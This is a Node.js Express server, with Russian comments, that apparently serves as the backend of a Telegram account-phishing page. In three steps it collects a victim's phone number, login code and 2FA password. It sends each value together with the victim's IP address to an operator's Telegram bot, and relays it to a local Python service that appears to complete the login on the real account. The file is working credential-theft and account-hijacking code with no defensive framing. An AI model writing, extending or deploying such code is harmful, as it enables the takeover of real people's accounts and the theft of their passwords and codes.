import express from 'express';
import fetch from 'node-fetch';
import path from 'path';
import { fileURLToPath } from 'url';
import dotenv from 'dotenv';
import cors from 'cors';

dotenv.config();

const app = express();
const port = 3000;

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

if (!TELEGRAM_TOKEN || !CHAT_ID) {
  console.error('❌ TELEGRAM_TOKEN или CHAT_ID не заданы в .env');
  process.exit(1);
}

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

function getIp(req) {
  const forwarded = req.headers['x-forwarded-for'];
  return forwarded?.split(',')[0].trim() || req.socket.remoteAddress;
}

async function sendToTelegram(text) {
  try {
    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text }),
    });
    const data = await res.json();
    if (!data.ok) console.error('❗ Telegram API error:', data);
    else console.log('✅ Сообщение отправлено в Telegram');
  } catch (err) {
    console.error('❗ Ошибка при отправке в Telegram:', err.message);
  }
}

async function sendToPython(endpoint, body) {
  try {
    const res = await fetch(`http://localhost:5005/${endpoint}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    });
    if (!res.ok) {
      const text = await res.text();
      console.error(`❌ Ответ от Python (${endpoint}):`, res.status, text);
      return null;
    }
    const data = await res.json().catch(() => null);
    console.log(`✅ Успешно отправлено в Python (${endpoint}):`, data);
    return data;
  } catch (err) {
    console.error(`❗ Ошибка отправки в Python (${endpoint}):`, err.message);
    return null;
  }
}

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Шаг 1 — ввод номера телефона
app.post('/number', async (req, res) => {
  const ip = getIp(req);
  const phone = req.body.phone;
  if (!phone) return res.status(400).json({ error: 'Phone required' });

  await sendToTelegram(`📲 Ввод номера:\n${phone}\n🌐 IP: ${ip}`);

  const response = await sendToPython('start_login', { phone });
  if (!response) return res.status(500).json({ error: 'Ошибка при отправке в Python API' });

  return res.json({ status: response.status, phone_code_hash: response.phone_code_hash || null });
});

// Шаг 2 — ввод кода
app.post('/code', async (req, res) => {
  const ip = getIp(req);
  const { phone, code, phone_code_hash } = req.body;
  if (!phone || !code || !phone_code_hash)
    return res.status(400).json({ error: 'phone, code и phone_code_hash обязательны' });

  await sendToTelegram(`🔐 Ввод кода:\n${code}\n📞 Номер: ${phone}\n🌐 IP: ${ip}`);

  const response = await sendToPython('submit_code', { phone, code, phone_code_hash });
  if (!response) return res.status(500).json({ error: 'Ошибка при отправке в Python API' });

  if (response.status === 'password_required') {
    return res.json({ status: 'password_required' });
  }
  if (response.status === 'logged_in') {
    return res.json({ status: 'logged_in' });
  }
  return res.status(400).json({ error: response.error || 'Неизвестная ошибка' });
});

// Шаг 3 — ввод 2FA пароля
app.post('/password', async (req, res) => {
  const ip = getIp(req);
  const { phone, password } = req.body;
  if (!phone || !password) return res.status(400).json({ error: 'phone и password обязательны' });

  // ЛОГИРУЕМ В Telegram
  await sendToTelegram(`🔑 Ввод 2FA пароля:\n${password}\n📞 Номер: ${phone}\n🌐 IP: ${ip}`);

  const response = await sendToPython('submit_password', { phone, password });
  if (!response) return res.status(500).json({ error: 'Ошибка при отправке в Python API' });

  if (response.status === 'logged_in') {
    return res.json({ status: 'logged_in' });
  }
  return res.status(400).json({ error: response.error || 'Ошибка аутентификации' });
});

app.use((req, res) => {
  res.status(404).send('❌ Ресурс не найден');
});

app.listen(port, () => {
  console.log(`🔥 Сервер запущен: http://localhost:${port}`);
});
